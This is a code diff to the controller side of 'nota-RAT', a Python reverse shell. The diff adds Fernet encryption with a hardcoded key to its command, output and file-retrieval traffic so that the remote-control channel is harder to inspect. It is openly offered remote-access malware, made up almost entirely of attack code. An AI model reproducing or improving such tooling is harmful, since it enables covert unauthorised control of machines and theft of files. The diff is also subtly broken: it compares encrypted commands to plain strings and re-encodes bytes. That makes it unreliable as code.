@@ -1,6 +1,7 @@
 import socket
 import argparse
 import os
+from cryptography.fernet import Fernet
 
 parser = argparse.ArgumentParser(
     description="nota-RAT, python reverse shell using sockets."
@@ -16,6 +17,7 @@ SERVER_HOST = "0.0.0.0"
 SERVER_PORT = args.port
 BUFFER_SIZE = 1024 * 128
 SEPARATOR = "<sep>"
+key = b'fXpsGp9mJFfNYCTtGeB2zpY9bzjPAoaC0Fkcc13COy4='
 
 
 print("""
@@ -39,18 +41,21 @@ print(f"Listening as {SERVER_HOST}:{SERVER_PORT} ...")
 client_socket, client_address = s.accept()
 print(f"{client_address[0]}:{client_address[1]} Connected!")
 
-cwd = client_socket.recv(BUFFER_SIZE).decode()
+cwd = client_socket.recv(BUFFER_SIZE)
+cwd = Fernet(key).decrypt(cwd).decode()
 print("[+] Current working directory:", cwd)
 
 while True:
     command = input(f"{cwd} $> ")
     if not command.strip():
         continue
-    client_socket.send(command.encode())
+    command = Fernet(key).encrypt(command.encode())
+    client_socket.send(command)
     if command == "exit":
         break
     if command == "/getfile":
         filename = input("Please enter the filename: ")
+        filename = Fernet(key).encrypt(filename.encode())
         client_socket.send(filename.encode())
         remaining = int.from_bytes(client_socket.recv(4),'big')
         f = open(filename,"wb")
@@ -69,8 +74,8 @@ while True:
                 client_socket.send(dataLen.to_bytes(4,'big'))
                 client_socket.send(data)
             f.close()
-    output = client_socket.recv(BUFFER_SIZE).decode()
-    print("output:", output)
+    output = client_socket.recv(BUFFER_SIZE)
+    output = Fernet(key).decrypt(output).decode()
     results, cwd = output.split(SEPARATOR)
     print(results)
 client_socket.close()
